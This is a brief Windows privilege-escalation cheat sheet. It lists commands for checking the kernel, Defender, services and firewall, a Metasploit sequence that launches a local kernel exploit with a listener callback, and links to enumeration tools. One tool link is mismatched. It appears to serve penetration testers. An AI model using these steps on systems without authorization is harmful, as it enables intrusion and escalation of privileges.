  [Kernel exploits](#Kernel)
- [Antivirus](#Antivirus)
- [Metasploit](#Metasploit)
- [Tools](#Tools)
  - [Powershell](#Powershell)
  - [Executables](#Executables)
  - [Other](#Other)
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Kernel

### Check Kernel version
```
systeminfo
``` 

### Windows kernel exploits resources:
- https://github.com/SecWiki/windows-kernel-exploits
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Antivirus
 
### Check AV status
```
sc query windefend
```

### Check all services status
```
sc queryex type= service
```

### Check firewll status
```
netsh advfirewall firewall dump
```
```
netsh firewall show state
```
```
netsh firewall show config
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Metasploit

### local exploit suggester
```
meterpreter> run post/multi/recon/local_exploit_suggester
meterpreter> background
msf> use exploit/windows/local/ms10_015_kitrap0d (for example)
msf> options
msf> set session x
msf> set lhost
msf> set lport
msf> run
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Tools

### PowerShell:
- Sherlock.ps1
  - https://github.com/sherlock-project/sherlock

- PowerUp.ps1
  - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

- jaws-enum.ps1
  - https://github.com/411Hall/JAWS

### Executables
- winPEAS.exe
  - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

- Seatbelt.exe
  - https://github.com/GhostPack/Seatbelt

- Watson.exe
  - https://github.com/rasta-mouse/Watson

- SharpUp.exe

### Others
- Exploit Suggester(metasploit)
- windows-exploit-suggester.py (local)
